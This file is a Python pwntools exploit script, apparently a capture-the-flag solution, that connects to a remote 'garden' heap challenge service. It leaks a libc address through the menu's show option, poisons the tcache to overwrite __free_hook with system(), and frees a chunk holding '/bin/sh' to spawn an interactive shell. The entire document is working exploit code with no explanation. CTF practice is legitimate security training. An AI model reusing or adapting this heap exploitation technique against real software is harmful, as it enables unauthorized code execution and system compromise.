#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

# p = process('./garden')
p = remote('8.131.69.237', 32452)

def add(idx, payload):
  p.sendlineafter('>>', str(1))
  p.sendlineafter('tree index?', str(idx))
  p.sendafter('tree name?', payload)

def delete(idx):
  p.sendlineafter('>>', str(2))
  p.sendlineafter('tree index?', str(idx))

def show(idx):
  p.sendlineafter('>>', str(3))
  p.sendlineafter('tree index?', str(idx))

def binary():
  p.sendlineafter('>>', str(6))

def steal(idx):
  p.sendlineafter('>>', str(5))
  p.sendlineafter('which tree do you want to steal?', str(idx))

 
if __name__ == "__main__":
  __malloc_hook_offset = 0x1e4c30
  for i in range(9):
    add(i, 'Mech0n\n')

  for i in range(9):
    delete(i)

  for i in range(9):
    add(i, 'a' * 8)

  show(7)
  libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x1e4ca0
  success('LIBC:\t' + str(hex(libc)))

  free_hook = libc + 0x1e75a8
  system = libc + 0x052fd0

  # binary() # 0x9c0 -> 0x9f0
  # delete(8)

  for i in range(7):
    delete(i)

  delete(7)
  steal(8)

  binary()

  for i in range(7):
    add(i, '/bin/sh\x00')
  
  add(7, 'Mech0n\n')
  # add(8, 'Mech0n\n')
  delete(5)
  delete(6)
  delete(8)
  delete(7)

  payload = 'a' * 0xd0 + p64(0x110) * 2 + p64(free_hook)
  add(7, payload)
  sleep(0.1)
  add(8, 'Mech0n\n')
  add(6, p64(system))

  success('LIBC:\t' + str(hex(libc)))
  # gdb.attach(p)
  p.interactive()